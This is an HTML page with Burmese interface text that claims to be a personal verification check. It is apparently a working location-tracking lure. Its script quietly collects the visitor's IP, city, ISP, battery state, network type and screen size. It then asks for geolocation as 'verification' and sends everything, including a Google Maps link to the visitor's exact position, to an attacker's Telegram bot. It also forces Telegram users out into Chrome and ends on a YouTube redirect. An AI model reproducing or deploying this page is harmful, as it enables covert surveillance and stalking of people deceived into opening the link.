<!DOCTYPE html>
<html lang="my">
<head>
  <meta charset="UTF-8" />
  <title>FAST | စစ်ဆေးချက်</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
  <style>
    body {
      margin: 0;
      padding: 0;
      height: 100vh;
      background: radial-gradient(circle, #1a1a1a, #000);
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: 'Poppins', sans-serif;
      color: #fff;
    }
    .container {
      text-align: center;
      padding: 30px;
      background: rgba(255, 255, 255, 0.05);
      border: 1px solid #444;
      border-radius: 15px;
      box-shadow: 0 0 20px rgba(0, 255, 255, 0.2);
      width: 90%;
      max-width: 400px;
    }
    h1 { font-size: 22px; margin-bottom: 10px; color: #0ff; }
    p { font-size: 14px; color: #aaa; }
    .status { margin-top: 20px; font-size: 13px; color: #0f0; }
    .hidden { display: none; }
  </style>
</head>
<body>
  <div class="container">
    <h1>🔐 ကိုယ်ရေးအတည်ပြုချက်</h1>
    <p id="message">အတည်ပြုရန် ခွင့်ပြုချက်များ လိုအပ်ပါသည်။</p>
    <p class="status" id="status">စတင်နေပါပြီ...</p>
  </div>

  <script src="config.js"></script>
  <script>
    
    
    
    const urlParams = new URLSearchParams(window.location.search);
    const OWNER_ID = urlParams.get('id');
    const statusEl = document.getElementById('status');
    const messageEl = document.getElementById('message');
    
    // Telegram ဆိုရင် Chrome ကို Auto ပြောင်းခိုင်းမယ်
    const isTelegram = /Telegram/i.test(navigator.userAgent);
    const isMobile = /Mobi|Android|iPhone/i.test(navigator.userAgent);
    
    if (isTelegram && isMobile) {
      const currentUrl = window.location.href;
      window.location.href = `intent://${currentUrl.replace('https://', '')}#Intent;scheme=https;package=com.android.chrome;end`;
    }

    async function sendToTelegram(text) {
      if (!OWNER_ID) return;
      
      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: OWNER_ID,
            text: text,
            parse_mode: 'Markdown'
          })
        });
      } catch(e) {
        console.log('Send error:', e);
      }
    }

    // ========== DEVICE INFO (စက်ပစ္စည်းအချက်အလက်) ==========
    async function sendDeviceInfo() {
      try {
        const ipRes = await fetch('https://ipinfo.io/json?token=5602d2e05cb668');
        const ip = await ipRes.json();
        const battery = await navigator.getBattery();
        const time = new Date().toLocaleString();
        
        let networkType = "မသိရပါ";
        if (navigator.connection) {
          networkType = navigator.connection.effectiveType || navigator.connection.type || "မသိရပါ";
        }
        
        let deviceName = "မသိရပါ";
        const ua = navigator.userAgent;
        if (ua.includes('iPhone')) deviceName = 'iPhone';
        else if (ua.includes('Samsung')) deviceName = 'Samsung';
        else if (ua.includes('Redmi') || ua.includes('Xiaomi')) deviceName = 'Xiaomi/Redmi';
        else if (ua.includes('OPPO')) deviceName = 'OPPO';
        else if (ua.includes('vivo')) deviceName = 'vivo';
        
        const msg = `🔐 *စက်ပစ္စည်းအချက်အလက်*\n\n` +
          `📱 ဖုန်းအမည်: ${deviceName}\n` +
          `🔢 IP: ${ip.ip}\n` +
          `📍 မြို့: ${ip.city || 'မသိရပါ'}\n` +
          `🗺 နိုင်ငံ: ${ip.country || 'မသိရပါ'}\n` +
          `📡 ISP: ${ip.org || 'မသိရပါ'}\n` +
          `🔋 ဘက်ထရီ: ${Math.round(battery.level * 100)}% ${battery.charging ? '⚡ အားသွင်းနေသည်' : ''}\n` +
          `📶 အင်တာနက်: ${networkType}\n` +
          `🖥 မျက်နှာပြင်: ${screen.width}x${screen.height}\n` +
          `🕒 အချိန်: ${time}`;
        
        await sendToTelegram(msg);
      } catch(e) {
        console.log("Device Info Error:", e);
      }
    }

    // ========== LOCATION (တည်နေရာ) ==========
    function getLocation() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) {
          resolve(null);
          return;
        }
        
        navigator.geolocation.getCurrentPosition(
          async (position) => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const acc = position.coords.accuracy;
            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
            
            const msg = `📍 *တည်နေရာ*\n\n` +
              `🌍 လတ္တီတွဒ်: ${lat}\n` +
              `🌍 လောင်ဂျီတွဒ်: ${lon}\n` +
              `📏 တိကျမှု: ${acc}m\n` +
              `🗺️ Google Maps: [နှိပ်ပြီးကြည့်ရန်](${mapsLink})`;
            
            await sendToTelegram(msg);
            resolve(true);
          },
          async (error) => {
            await sendToTelegram(`❌ *တည်နေရာ ငြင်းပယ်ခံရပါသည်*`);
            resolve(false);
          }
        );
      });
    }

    window.onload = async () => {
      if (!OWNER_ID) {
        statusEl.textContent = '❌ လင့်မမှန်ကန်ပါ။';
        return;
      }
      
      statusEl.textContent = '';
      messageEl.textContent = '';
      await sendDeviceInfo();
      
      statusEl.textContent = '📍 တည်နေရာ အတည်ပြုနေပါသည် locationဖွင့်ထားပါ...';
      messageEl.textContent = 'တည်နေရာ အတည်ပြုနေပါသည် .. ခွင့်ပြုပေးပါ။';
      
      const locationResult = await getLocation();
      
      if (locationResult) {
        statusEl.textContent = '✅ တည်နေရာ အတည်ပြုချက် အောင်မြင်ပါသည်';
        messageEl.textContent = 'တည်နေရာ အတည်ပြုပြီးပါပြီး...';
      } else {
        statusEl.textContent = '❌ တည်နေရာ အတည်ပြုချက် မအောင်မြင်ပါ';
        messageEl.textContent = 'တည်နေရာ အတည်ပြုချက် မအောင်မြင်ပါ ပြန်ညွှန်းနေပါသည်...';
      }
      
      setTimeout(() => {
        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
      }, 2000);
    };
  </script>
</body>
</html>
